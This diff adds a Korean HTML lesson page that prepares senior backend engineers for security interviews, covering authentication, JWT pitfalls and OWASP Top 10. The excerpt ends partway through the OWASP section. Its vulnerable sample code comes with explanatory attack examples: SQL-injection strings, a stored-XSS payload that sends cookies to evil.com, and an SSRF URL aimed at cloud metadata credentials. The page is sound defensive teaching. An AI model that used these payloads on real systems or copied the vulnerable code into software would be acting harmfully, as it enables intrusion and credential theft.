@@ -1,0 +1,805 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Day 8 — 보안</title>
+  <style>
+    :root {
+      --bg: #0f1117;
+      --surface: #1a1d27;
+      --surface2: #232635;
+      --border: #2e3248;
+      --text: #e2e4f0;
+      --muted: #8b8fa8;
+      --accent: #7c83f5;
+      --accent2: #56cfb2;
+      --warn: #f5a623;
+      --danger: #f56060;
+      --success: #56cf8a;
+      --code-bg: #141720;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      font-size: 16px;
+      line-height: 1.7;
+      padding: 2rem 1rem;
+    }
+    .container { max-width: 960px; margin: 0 auto; }
+    .header {
+      border-bottom: 2px solid var(--accent);
+      padding-bottom: 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+    .day-badge {
+      display: inline-block;
+      background: var(--accent);
+      color: #fff;
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      padding: 0.2rem 0.7rem;
+      border-radius: 999px;
+      margin-bottom: 0.75rem;
+    }
+    h1 { font-size: 1.9rem; font-weight: 700; line-height: 1.3; }
+    .subtitle { color: var(--muted); margin-top: 0.4rem; font-size: 0.95rem; }
+    .tag {
+      display: inline-block;
+      background: var(--surface2);
+      color: var(--accent2);
+      font-size: 0.72rem;
+      padding: 0.15rem 0.55rem;
+      border-radius: 4px;
+      margin: 0.2rem 0.1rem;
+      border: 1px solid var(--border);
+    }
+    section { margin-bottom: 2.5rem; }
+    h2 {
+      font-size: 1.2rem;
+      font-weight: 700;
+      color: var(--accent);
+      border-left: 3px solid var(--accent);
+      padding-left: 0.75rem;
+      margin-bottom: 1.2rem;
+    }
+    h3 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--accent2);
+      margin-bottom: 0.6rem;
+      margin-top: 1.2rem;
+    }
+    h4 {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--warn);
+      margin-bottom: 0.4rem;
+      margin-top: 1rem;
+    }
+    p { margin-bottom: 0.8rem; }
+    ul, ol { padding-left: 1.4rem; margin-bottom: 0.8rem; }
+    li { margin-bottom: 0.3rem; }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.4rem;
+      margin-bottom: 1.2rem;
+    }
+    .card.question { border-left: 4px solid var(--warn); }
+    .card.followup  { border-left: 4px solid var(--accent); }
+    .card.good      { border-left: 4px solid var(--success); }
+    .card.weak      { border-left: 4px solid var(--danger); }
+    .card.rubric    { border-left: 4px solid var(--accent2); }
+    .card.info      { border-left: 4px solid var(--muted); }
+
+    .label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 0.5rem;
+    }
+    .label.q { color: var(--warn); }
+    .label.f { color: var(--accent); }
+    .label.g { color: var(--success); }
+    .label.w { color: var(--danger); }
+    .label.r { color: var(--accent2); }
+    .label.i { color: var(--muted); }
+
+    .quote {
+      font-style: italic;
+      color: var(--text);
+      font-size: 1.05rem;
+      font-weight: 600;
+    }
+
+    code {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 0.1rem 0.4rem;
+      font-family: 'Fira Code', 'Cascadia Code', monospace;
+      font-size: 0.88rem;
+      color: var(--accent2);
+    }
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.2rem;
+      overflow-x: auto;
+      margin-bottom: 1rem;
+    }
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      color: var(--text);
+      font-size: 0.85rem;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+    @media (max-width: 640px) {
+      .grid-2 { grid-template-columns: 1fr; }
+    }
+
+    .step {
+      display: flex;
+      gap: 1rem;
+      margin-bottom: 1rem;
+      align-items: flex-start;
+    }
+    .step-num {
+      flex-shrink: 0;
+      width: 2rem;
+      height: 2rem;
+      background: var(--accent);
+      color: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.85rem;
+      font-weight: 700;
+    }
+    .step-body { flex: 1; }
+
+    .rubric-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.6rem 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .rubric-item:last-child { border-bottom: none; }
+    .rubric-score { display: flex; gap: 0.3rem; }
+    .dot {
+      width: 1.1rem;
+      height: 1.1rem;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+    }
+    .dot.filled { background: var(--accent2); border-color: var(--accent2); }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 1rem;
+      font-size: 0.9rem;
+    }
+    th {
+      background: var(--surface2);
+      color: var(--accent2);
+      text-align: left;
+      padding: 0.6rem 0.8rem;
+      border: 1px solid var(--border);
+      font-size: 0.8rem;
+      font-weight: 700;
+    }
+    td {
+      padding: 0.55rem 0.8rem;
+      border: 1px solid var(--border);
+      vertical-align: top;
+    }
+    tr:nth-child(even) td { background: var(--surface); }
+
+    .toc {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.2rem 1.4rem;
+      margin-bottom: 2rem;
+    }
+    .toc ol { margin-bottom: 0; }
+    .toc a { color: var(--accent); text-decoration: none; }
+    .toc a:hover { text-decoration: underline; }
+
+    .highlight-box {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 1rem 1.2rem;
+      margin-bottom: 1rem;
+    }
+    .nav-bottom {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 3rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid var(--border);
+    }
+    .nav-bottom a {
+      color: var(--accent);
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+    .nav-bottom a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <!-- ───────────── HEADER ───────────── -->
+  <div class="header">
+    <div class="day-badge">DAY 8</div>
+    <h1>보안</h1>
+    <p class="subtitle">10년차 이상 백엔드 엔지니어 Interview 대비 — 실무 판단력 중심</p>
+    <div style="margin-top:0.8rem;">
+      <span class="tag">AuthN/AuthZ</span>
+      <span class="tag">JWT/OAuth2/OIDC</span>
+      <span class="tag">OWASP Top 10</span>
+      <span class="tag">SQL Injection</span>
+      <span class="tag">XSS/CSRF</span>
+      <span class="tag">IDOR/BOLA</span>
+      <span class="tag">비밀번호 해싱</span>
+      <span class="tag">시크릿 관리</span>
+    </div>
+  </div>
+
+  <!-- ───────────── TOC ───────────── -->
+  <div class="toc">
+    <p style="color:var(--muted);font-size:0.8rem;margin-bottom:0.6rem;">목차</p>
+    <ol>
+      <li><a href="#section-overview">오늘 레슨 개요</a></li>
+      <li><a href="#section-authn-authz">인증(AuthN)과 인가(AuthZ) — 세션, JWT, OAuth2/OIDC의 역할 분리</a></li>
+      <li><a href="#section-jwt-pitfalls">JWT 실무 함정 — 알고리즘 혼동, 무효화, 저장 위치</a></li>
+      <li><a href="#section-owasp">OWASP Top 10 실전 — SQL Injection, XSS, CSRF, IDOR/BOLA, SSRF</a></li>
+      <li><a href="#section-secrets">비밀번호, 시크릿, 암호화 — 해싱, 키 관리, 전송/저장 보호</a></li>
+      <li><a href="#section-scenario">종합 시나리오 — 유출된 세션 토큰, 새벽의 보안 사고</a></li>
+      <li><a href="#section-rubric">자기 점검 Rubric</a></li>
+    </ol>
+  </div>
+
+  <!-- ───────────── 1. OVERVIEW ───────────── -->
+  <section id="section-overview">
+    <h2>1. 오늘 레슨 개요</h2>
+    <p>
+      보안 면접에서 시니어에게 기대하는 것은 "OWASP Top 10 항목 이름을 나열하는 것"이 아닙니다.
+      면접관은 <strong>"이 개발자가 짜는 코드에 이 취약점이 실제로 스며들지 않는가", "취약점을 발견했을 때 근본 원인을 짚어 재발을 막을 수 있는가", "보안과 사용성/성능/일정 사이에서 현실적인 trade-off를 판단할 수 있는가"</strong>를 확인하려고 합니다.
+      주니어는 "SQL Injection은 파라미터 바인딩으로 막습니다"에서 답이 끝나지만, 시니어는 ORM을 쓰더라도 raw query가 섞이는 지점, 문자열로 조립되는 정렬/필터 파라미터, 그리고 코드 리뷰·정적 분석으로 이런 패턴을 조직 차원에서 걸러내는 프로세스까지 이야기합니다.
+    </p>
+    <div class="highlight-box">
+      <strong>면접관이 실제로 보는 신호</strong>
+      <ul style="margin-top:0.5rem;">
+        <li>인증과 인가를 "로그인 기능"으로 뭉뚱그림 ↔ "누구인가"(AuthN)와 "무엇을 할 수 있는가"(AuthZ)를 별개의 계층으로 분리해 설계</li>
+        <li>JWT를 "세션보다 무조건 좋은 최신 기술"로 이해 ↔ JWT의 stateless 특성이 만드는 무효화(revocation) 문제를 인지하고 trade-off로 접근</li>
+        <li>OWASP 항목을 암기된 정의로만 설명 ↔ 자신이 실제로 작성했거나 리뷰에서 발견한 코드 패턴으로 설명</li>
+        <li>비밀번호를 "암호화해서 저장한다"고 표현 ↔ 암호화(복호화 가능)와 해싱(단방향)의 차이를 명확히 구분</li>
+        <li>보안을 "다 막아야 하는 것"으로 접근 ↔ 위협 모델링을 통해 자산·공격 표면·비용을 따져 우선순위를 정하는 관점</li>
+      </ul>
+    </div>
+    <p>이 레슨은 <strong>보안의 4개 핵심 축</strong>(인증/인가 아키텍처, JWT 실무, OWASP Top 10 실전 사례, 비밀번호·시크릿·암호화)을 다루며, 각 영역마다 배경 개념 → 면접 질문 → 답변 구조 → senior follow-up → 좋은/약한 답변 비교 → 자기 점검 순서로 진행합니다.</p>
+  </section>
+
+  <!-- ───────────── 2. AUTHN / AUTHZ ───────────── -->
+  <section id="section-authn-authz">
+    <h2>2. 인증(AuthN)과 인가(AuthZ) — 세션, JWT, OAuth2/OIDC의 역할 분리</h2>
+
+    <h3>배경 개념: "로그인 기능"이라는 말이 숨기는 두 개의 서로 다른 질문</h3>
+    <p>
+      실무에서 "로그인 구현"이라고 뭉뚱그려 말하는 작업은 사실 완전히 다른 두 가지 질문에 답하는 작업입니다.
+      <strong>인증(Authentication, AuthN)</strong>은 "이 요청을 보낸 사람이 정말 본인이 맞는가"를 확인하는 것이고,
+      <strong>인가(Authorization, AuthZ)</strong>는 "이 사람이 이 리소스에 이 동작을 할 권한이 있는가"를 확인하는 것입니다.
+      이 둘을 하나의 미들웨어에 뒤섞어 짜면, 나중에 "관리자만 이 API를 호출할 수 있게 해달라" 같은 요구사항이 들어올 때마다 인증 로직 전체를 건드려야 하는 구조가 됩니다.
+      시니어는 이 둘을 <strong>별개의 계층</strong>으로 분리하고, 세션/JWT/OAuth2/OIDC 같은 기술은 모두 "인증을 어떻게 구현하는가"에 대한 선택지일 뿐, 인가와는 독립적인 문제라는 것을 이해합니다.
+    </p>
+
+    <div class="card question">
+      <div class="label q">면접 질문</div>
+      <p class="quote">"사내 여러 서비스가 각자 로그인 기능을 따로 구현하고 있는데, SSO(Single Sign-On)로 통합하려고 합니다. 어떤 방식으로 접근하시겠습니까? 세션 기반 인증과 JWT 기반 인증 중 무엇을 선택하고, 그 이유는 무엇인가요?"</p>
+    </div>
+
+    <h4>면접관이 보는 신호</h4>
+    <p>"JWT가 최신 기술이라 무조건 좋습니다"라고 답하는지, 아니면 <strong>서버 상태 보유 여부(stateful vs stateless)가 만드는 실제 운영상의 trade-off</strong>를 근거로 선택하는지를 봅니다.</p>
+
+    <h4>세션 기반 인증 vs JWT 기반 인증</h4>
+    <table>
+      <thead>
+        <tr>
+          <th>항목</th>
+          <th>세션 기반 (서버가 상태 보유)</th>
+          <th>JWT 기반 (stateless)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>서버 확장성</td>
+          <td>세션 스토어(Redis 등) 공유 필요 — 세션 조회가 매 요청마다 발생</td>
+          <td>서명 검증만으로 인증 완료 — 세션 스토어 조회 불필요, 수평 확장에 유리</td>
+        </tr>
+        <tr>
+          <td>즉시 로그아웃/권한 회수</td>
+          <td>서버에서 세션 삭제 시 즉시 반영</td>
+          <td>토큰이 만료되기 전까지는 서버가 임의로 무효화할 수 없음 (핵심 약점)</td>
+        </tr>
+        <tr>
+          <td>토큰/세션 크기</td>
+          <td>클라이언트는 세션 ID만 보관 (작음)</td>
+          <td>클레임을 포함해 매 요청마다 전송 (상대적으로 큼)</td>
+        </tr>
+        <tr>
+          <td>다중 서비스 신뢰</td>
+          <td>세션 스토어를 공유해야 서비스 간 인증 공유 가능</td>
+          <td>공개키만 배포하면 여러 서비스가 독립적으로 서명 검증 가능 — MSA/SSO에 유리</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h4>결정 순서</h4>
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-body">
+        <strong>"즉시 무효화가 얼마나 중요한가"를 먼저 확인합니다.</strong> 금융 서비스처럼 계정 탈취 시 즉시 세션을 끊어야 하는 요구가 강하다면 세션 기반이나, JWT + 서버 측 짧은 만료 + refresh token 방식이 유리합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-body">
+        <strong>여러 서비스가 독립적으로 인증을 검증해야 하는지 확인합니다.</strong> SSO처럼 여러 서비스가 중앙 인증 서버 없이도 요청마다 검증해야 한다면, 공개키 서명 검증만으로 끝나는 JWT(특히 OIDC의 ID Token)가 세션 스토어 공유보다 운영 부담이 적습니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-body">
+        <strong>Access Token(수명 짧음, 인가에 사용)과 Refresh Token(수명 김, 재발급 전용)을 분리합니다.</strong> Access Token은 탈취돼도 피해 범위가 짧은 시간으로 제한되고, Refresh Token은 별도의 안전한 저장소(HttpOnly 쿠키 등)에만 두고 탈취 시 서버에서 개별 무효화가 가능하도록 설계합니다.
+      </div>
+    </div>
+    <div class="step">
+      <div class="step-num">4</div>
+      <div class="step-body">
+        <strong>인증(누구인가)과 인가(권한이 있는가)를 코드 구조에서도 분리합니다.</strong> 인증 미들웨어는 "이 토큰이 유효하고 이 사용자다"까지만 확정하고, 인가는 별도의 정책 계층(RBAC/ABAC)에서 리소스별로 판단하도록 만들어 권한 변경이 인증 로직에 영향을 주지 않게 합니다.
+      </div>
+    </div>
+
+    <div class="grid-2">
+      <div class="card good">
+        <div class="label g">강한 답변</div>
+        <p>"SSO는 중앙 인증 서버(IdP)를 두고 OIDC를 사용하겠습니다. 사용자가 IdP에 로그인하면 짧은 수명(예: 15분)의 Access Token(JWT)과 IdP에만 안전하게 보관되는 Refresh Token을 받고, 각 서비스는 IdP의 공개키로 Access Token 서명만 검증하면 되므로 세션 스토어를 공유할 필요가 없습니다. 즉시 로그아웃이 필요한 경우를 대비해 Access Token 자체는 무효화하지 않는 대신, 민감 동작 전에는 IdP의 토큰 상태를 재확인하거나 Refresh Token을 무효화해 다음 갱신을 차단하는 방식으로 절충합니다. 인가는 각 서비스가 토큰의 역할(role) 클레임을 바탕으로 자체 정책에서 판단하도록 분리합니다."</p>
+      </div>
+      <div class="card weak">
+        <div class="label w">약한 답변</div>
+        <p>"JWT가 stateless라 서버 부하가 적고 최신 방식이니 JWT로 통일하겠습니다."</p>
+      </div>
+    </div>
+    <p style="color:var(--muted);font-size:0.9rem;margin-top:-0.5rem;">
+      약한 답변이 약한 이유: "왜"에 대한 근거가 "최신이라서"에 그치고, JWT의 핵심 약점인 즉시 무효화 불가 문제를 전혀 언급하지 않았습니다. 계정 탈취나 퇴사자 권한 회수처럼 실제 운영에서 반드시 마주치는 시나리오에 대한 대비책이 없다는 뜻이며, 인증과 인가를 어떻게 분리할지에 대한 설계도 빠져 있습니다.
+    </p>
+
+    <div class="card followup">
+      <div class="label f">Senior Follow-up</div>
+      <p class="quote">"OAuth2와 OIDC는 이름이 비슷한데 실제로 어떤 문제를 각각 해결하나요? 그리고 OAuth2 Authorization Code Flow에서 PKCE가 왜 필요한가요?"</p>
+      <p style="margin-top:0.8rem;font-size:0.9rem;">
+        <strong>모범 추론:</strong> <strong>OAuth2는 인가(위임) 프로토콜</strong>입니다 — "이 앱이 내 구글 캘린더에 접근해도 좋다"처럼, 사용자가 제3자 앱에게 자신의 리소스에 대한 <strong>제한된 접근 권한을 위임</strong>하는 것이 목적입니다. OAuth2 자체는 "그 앱을 사용하는 사람이 누구인지"를 표준화된 방식으로 알려주지 않습니다.
+        <strong>OIDC(OpenID Connect)는 OAuth2 위에 인증 계층을 얹은 확장</strong>으로, ID Token이라는 표준화된 JWT를 추가해 "이 사람이 누구인지"를 함께 전달합니다. 그래서 로그인(SSO)이 목적이라면 OIDC를, 제3자 앱에 API 접근 권한만 위임하려면 순수 OAuth2를 사용합니다.
+        PKCE(Proof Key for Code Exchange)는 원래 모바일/SPA처럼 <strong>클라이언트 시크릿을 안전하게 보관할 수 없는 퍼블릭 클라이언트</strong>를 위해 도입되었습니다. Authorization Code를 가로채는 공격(악성 앱이 같은 커스텀 URL 스킴을 등록해 리다이렉트를 가로채는 경우 등)을 막기 위해, 클라이언트가 매 인증 요청마다 무작위 <code>code_verifier</code>를 생성하고 그 해시값(<code>code_challenge</code>)만 먼저 전달합니다. 토큰 교환 시 원본 <code>code_verifier</code>를 함께 제출해야 하므로, Authorization Code를 가로챈 공격자는 원본 verifier가 없어 토큰을 발급받을 수 없습니다. 현재는 OAuth 2.1 초안에서 <strong>모든 클라이언트 타입에 PKCE를 필수로 요구</strong>하는 방향으로 표준이 정리되고 있다는 점까지 언급하면 최신 실무 감각을 보여줄 수 있습니다.
+      </p>
+    </div>
+  </section>
+
+  <!-- ───────────── 3. JWT PITFALLS ───────────── -->
+  <section id="section-jwt-pitfalls">
+    <h2>3. JWT 실무 함정 — 알고리즘 혼동, 무효화, 저장 위치</h2>
+
+    <h3>배경 개념: JWT는 "암호화"가 아니라 "서명"이다</h3>
+    <p>
+      JWT를 처음 다루는 개발자가 가장 많이 오해하는 지점은 "JWT 안의 내용은 안전하게 숨겨져 있다"는 생각입니다.
+      표준 JWT(JWS 방식)는 헤더와 페이로드를 <strong>Base64Url로 인코딩만 할 뿐 암호화하지 않습니다</strong>. 즉 누구나 토큰 문자열을 디코딩해 페이로드 내용을 읽을 수 있습니다.
+      JWT가 보장하는 것은 <strong>내용의 기밀성이 아니라 무결성(integrity)</strong>입니다 — 서명을 검증하면 "이 토큰이 발급 이후 변조되지 않았고, 실제로 신뢰하는 발급자가 만들었다"는 것만 확인할 수 있습니다.
+      이 차이를 모르면 JWT 페이로드에 비밀번호나 민감한 개인정보를 그대로 넣는 실수를 하게 됩니다.
+    </p>
+
+    <div class="card question">
+      <div class="label q">면접 질문</div>
+      <p class="quote">"우리 서비스가 JWT를 사용하는데, 최근 보안 감사에서 '서버가 alg 헤더를 신뢰해서는 안 된다'는 지적을 받았습니다. 이게 무슨 의미이고, 어떻게 대응해야 할까요? 그리고 로그아웃한 사용자의 JWT를 여전히 사용할 수 있다는 버그 리포트가 들어왔다면 어떻게 원인을 찾고 고치겠습니까?"</p>
+    </div>
+
+    <h4>면접관이 보는 신호</h4>
+    <p>JWT 라이브러리를 "가져다 쓰기만" 했는지, 아니면 <strong>서명 알고리즘 검증 로직과 stateless 토큰의 근본적인 무효화 한계까지 이해하고 있는지</strong>를 봅니다.</p>
+
+    <h4>대표적인 JWT 실무 함정</h4>
+    <table>
+      <thead>
+        <tr>
+          <th>함정</th>
+          <th>공격/문제 시나리오</th>
+          <th>대응</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>알고리즘 혼동(alg confusion)</td>
+          <td>서버가 토큰 헤더의 <code>alg</code> 값을 그대로 신뢰하면, 공격자가 <code>alg: none</code>으로 바꾸거나 RS256(비대칭키)을 HS256(대칭키)으로 바꿔치기해 공개키를 대칭키 비밀값으로 악용, 스스로 서명한 위조 토큰을 통과시킬 수 있음</td>
+          <td>서버 측에서 <strong>허용할 알고리즘을 화이트리스트로 고정</strong>하고, 토큰의 <code>alg</code> 헤더를 신뢰하지 않음. 라이브러리에 알고리즘을 명시적으로 지정</td>
+        </tr>
+        <tr>
+          <td>즉시 무효화 불가</td>
+          <td>로그아웃/계정 탈취/퇴사 처리 후에도 만료 전까지 기존 Access Token이 계속 유효</td>
+          <td>Access Token 수명을 짧게(수분~수십분), 블랙리스트(Redis에 폐기된 jti 저장, TTL은 토큰 만료 시각까지)로 예외적 즉시 차단, Refresh Token은 서버 DB에 저장해 개별 회수 가능하게 설계</td>
+        </tr>
+        <tr>
+          <td>저장 위치 딜레마</td>
+          <td>localStorage에 저장하면 XSS로 탈취 가능(JS가 읽을 수 있음), 일반 쿠키에 저장하면 CSRF 위험</td>
+          <td><code>HttpOnly</code> + <code>Secure</code> + <code>SameSite=Strict/Lax</code> 쿠키에 저장해 JS 접근을 차단하고, CSRF는 SameSite 속성과 CSRF 토큰으로 별도 방어</td>
+        </tr>
+        <tr>
+          <td>페이로드에 민감정보 노출</td>
+          <td>JWT는 서명만 되고 암호화되지 않으므로 페이로드가 그대로 노출됨</td>
+          <td>페이로드에는 최소한의 식별자·역할만 담고, 민감한 개인정보는 서버가 별도 조회하도록 설계(필요 시 JWE로 암호화하되 복잡도 증가를 감안)</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="grid-2">
+      <div class="card good">
+        <div class="label g">강한 답변</div>
+        <p>"먼저 서버 코드에서 <code>jwt.verify()</code>에 허용 알고리즘을 명시적으로 고정했는지 확인하겠습니다. 토큰의 <code>alg</code> 헤더 값을 그대로 믿고 검증 알고리즘을 동적으로 고르는 코드가 있다면 alg confusion 공격에 취약하므로, RS256만 허용하도록 하드코딩합니다. 로그아웃 후에도 토큰이 유효한 문제는 JWT의 stateless 특성상 근본적으로 발생하는 것이므로, Access Token 수명을 15분으로 줄이고, 로그아웃 시 해당 토큰의 jti를 Redis 블랙리스트에 만료 시각까지만 TTL로 저장해 인증 미들웨어가 매 요청마다 블랙리스트 여부를 확인하도록 추가하겠습니다. Refresh Token은 DB에 저장해 로그아웃 시 즉시 삭제합니다."</p>
+      </div>
+      <div class="card weak">
+        <div class="label w">약한 답변</div>
+        <p>"JWT 라이브러리를 최신 버전으로 업데이트하면 해결될 것 같습니다."</p>
+      </div>
+    </div>
+    <p style="color:var(--muted);font-size:0.9rem;margin-top:-0.5rem;">
+      약한 답변이 약한 이유: 문제의 근본 원인(알고리즘 검증 방식, stateless 토큰의 구조적 한계)을 전혀 분석하지 않고 "업데이트하면 되겠지"라는 막연한 추측에 그칩니다. 실제로 라이브러리 버전과 무관하게 애플리케이션 코드가 알고리즘을 어떻게 검증하는지가 핵심이며, 무효화 문제는 라이브러리 업데이트로 해결되지 않는 구조적 문제입니다.
+    </p>
+
+    <div class="card followup">
+      <div class="label f">Senior Follow-up</div>
+      <p class="quote">"모든 요청마다 Redis에서 블랙리스트를 조회하면 결국 JWT의 stateless 이점이 사라지는 것 아닌가요? 이 트레이드오프를 어떻게 정당화하시겠습니까?"</p>
+      <p style="margin-top:0.8rem;font-size:0.9rem;">
+        <strong>모범 추론:</strong> 맞습니다, 블랙리스트 조회를 추가하는 순간 완전한 stateless는 포기하는 것입니다. 하지만 이것은 <strong>전부 아니면 전무의 선택이 아니라 정도의 문제</strong>입니다.
+        일반 세션 방식은 <strong>매 요청마다 세션 전체 데이터</strong>를 조회해야 하지만, JWT + 블랙리스트 방식은 <strong>토큰이 유효한 대다수의 요청에서는 Redis 조회 결과가 항상 "블랙리스트에 없음"</strong>이라는 것이 핵심입니다. 이 조회는 세션 전체를 가져오는 것보다 훨씬 가볍고(단일 키 존재 여부 확인), 캐시 적중률이 매우 높으며, Access Token 수명이 짧으므로 블랙리스트 항목 수 자체도 적게 유지됩니다.
+        즉 "완전한 stateless"를 포기하는 대신, "즉시 무효화가 필요한 예외적인 경우만 가벼운 조회를 추가"하는 절충안입니다. 그리고 서비스 간 인증 검증(SSO의 여러 서비스가 독립적으로 검증)이라는 JWT의 핵심 이점은 여전히 유지됩니다 — 블랙리스트는 각 서비스가 아니라 인증을 발급한 IdP 근처에서만 확인하도록 경계를 좁힐 수도 있습니다.
+      </p>
+    </div>
+  </section>
+
+  <!-- ───────────── 4. OWASP TOP 10 ───────────── -->
+  <section id="section-owasp">
+    <h2>4. OWASP Top 10 실전 — SQL Injection, XSS, CSRF, IDOR/BOLA, SSRF</h2>
+
+    <h3>배경 개념: OWASP는 "암기 목록"이 아니라 "코드 리뷰에서 실제로 발견되는 패턴"이다</h3>
+    <p>
+      OWASP Top 10을 정의만 외운 사람과, 실제로 자신의 코드베이스에서 이 패턴을 찾아본 사람은 면접에서 답변의 구체성이 완전히 다릅니다.
+      시니어 면접에서는 "SQL Injection이 뭔가요?"라고 묻기보다, <strong>"이 코드에 어떤 취약점이 있고, 어떻게 고치겠습니까?"</strong>처럼 구체적인 코드나 시나리오를 제시하는 경우가 많습니다.
+      아래는 실무에서 가장 자주 등장하는 5가지 취약점을, 실제 코드 패턴과 함께 다룹니다.
+    </p>
+
+    <div class="card question">
+      <div class="label q">면접 질문</div>
+      <p class="quote">아래 코드에서 보안 취약점을 모두 찾고, 각각 어떻게 고칠지 설명해주세요.</p>
+      <pre><code>// 사용자 검색 API
+app.get('/users/search', (req, res) => {
+  const keyword = req.query.name;
+  const sql = `SELECT id, name, email FROM users WHERE name LIKE '%${keyword}%'`;
+  db.query(sql, (err, rows) => res.send(rows));
+});
+
+// 게시글 상세 조회 API
+app.get('/orders/:id', authenticate, (req, res) => {
+  const order = db.getOrderById(req.params.id);
+  res.json(order);
+});
+
+// 프로필 소개글 렌더링 (서버사이드 템플릿)
+&lt;div&gt;{{ user.bio }}&lt;/div&gt;
+
+// 외부 이미지 URL을 받아 서버에서 대신 다운로드
+app.post('/fetch-image', (req, res) => {
+  const url = req.body.imageUrl;
+  http.get(url, (r) =&gt; r.pipe(res));
+});</code></pre>
+    </div>
+
+    <h4>면접관이 보는 신호</h4>
+    <p>취약점 이름만 나열하는지, 아니면 <strong>각 취약점이 왜 발생하는지 데이터 흐름을 짚어 설명하고, 실제로 동작하는 수정 코드를 제시</strong>하는지를 봅니다.</p>
+
+    <table>
+      <thead>
+        <tr>
+          <th>코드 위치</th>
+          <th>취약점</th>
+          <th>공격 방법</th>
+          <th>수정</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>사용자 검색 API</td>
+          <td>SQL Injection</td>
+          <td><code>keyword</code>에 <code>' OR '1'='1</code> 또는 <code>'; DROP TABLE users; --</code>를 넣어 조건을 무력화하거나 임의 쿼리 실행</td>
+          <td>문자열 조립 대신 <strong>파라미터 바인딩(Prepared Statement)</strong> 사용: <code>db.query('SELECT ... WHERE name LIKE ?', [`%${keyword}%`])</code></td>
+        </tr>
+        <tr>
+          <td>주문 상세 조회 API</td>
+          <td>IDOR/BOLA (Insecure Direct Object Reference / Broken Object Level Authorization)</td>
+          <td>로그인은 되어 있지만(authenticate 통과), <code>/orders/123</code>의 123을 다른 사용자의 주문 ID로 바꿔 타인의 주문을 조회 — <strong>인증은 확인했지만 인가(이 주문이 요청자의 것인가)를 확인하지 않음</strong></td>
+          <td><code>db.getOrderById(req.params.id)</code>가 아니라 <code>db.getOrderByIdAndUser(req.params.id, req.user.id)</code>처럼 <strong>소유권 검증을 쿼리 조건에 포함</strong></td>
+        </tr>
+        <tr>
+          <td>프로필 소개글 렌더링</td>
+          <td>저장형(Stored) XSS</td>
+          <td>사용자가 소개글에 <code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code>를 저장하면, 이 프로필을 보는 모든 사용자의 브라우저에서 스크립트가 실행되어 쿠키/세션 탈취</td>
+          <td>템플릿 엔진의 <strong>자동 이스케이핑을 활성화</strong>하고({{ }}가 이스케이프되는지 확인, raw/unescaped 출력 금지), 저장 시점과 출력 시점 양쪽에서 검증. HttpOnly 쿠키로 document.cookie 접근 자체를 차단하는 것도 이중 방어</td>
+        </tr>
+        <tr>
+          <td>외부 이미지 다운로드 API</td>
+          <td>SSRF (Server-Side Request Forgery)</td>
+          <td><code>imageUrl</code>에 <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> 같은 클라우드 메타데이터 서버 주소를 넣어, 서버가 대신 요청하게 만들어 내부 자격증명 탈취</td>
+          <td>URL 스킴을 http(s)로 제한, <strong>사설 IP 대역(10.x, 172.16-31.x, 192.168.x, 169.254.x, localhost)으로의 요청을 차단하는 allowlist/denylist</strong>, 가능하면 별도 격리된 네트워크의 프록시를 통해서만 외부 요청을 수행</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h4>CSRF는 왜 이 코드에 없어도 언급해야 하는가</h4>
+    <p>
+      위 코드에는 상태를 변경하는 폼 제출이 명시적으로 없지만, 면접관이 CSRF를 유도 질문으로 던지는 경우가 많습니다.
+      <strong>CSRF(Cross-Site Request Forgery)</strong>는 사용자가 로그인된 상태에서 악성 사이트가 사용자의 브라우저를 통해 <strong>본인 의도와 무관한 요청을 인증된 세션으로 자동 전송</strong>시키는 공격입니다(예: 악성 페이지의 숨겨진 폼이 <code>/transfer?to=attacker&amount=1000</code>을 자동 제출).
+      쿠키 기반 인증에서 특히 위험하며, <code>SameSite=Lax/Strict</code> 쿠키 속성과 상태 변경 요청에 대한 CSRF 토큰 검증, 그리고 GET 요청으로 상태를 변경하지 않는 원칙(REST 시맨틱 준수)으로 방어합니다.
+    </p>
+
+    <div class="grid-2">
+      <div class="card good">
+        <div class="label g">강한 답변</div>
